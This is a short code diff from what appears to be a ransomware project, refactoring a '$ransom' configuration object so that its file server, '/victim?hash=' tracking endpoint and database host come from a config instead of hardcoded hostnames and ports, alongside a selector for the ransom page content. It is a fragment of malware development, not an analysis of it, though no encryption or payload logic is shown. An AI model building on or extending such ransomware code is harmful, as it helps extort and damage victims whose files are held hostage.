@@ -13,9 +13,9 @@ var main = function () {
 
     var $ransom = {
         server: {
-            files: hostname + ":" + port /*8000*/,
-            hash: hostname + ":" + port + "/victim?hash=",
-            db: hostname + ":3000"
+            files: config.files,
+            hash: config.files + "/victim?hash=",
+            db: config.db
         },
         victimPage: {
             content: ".ransom-content",
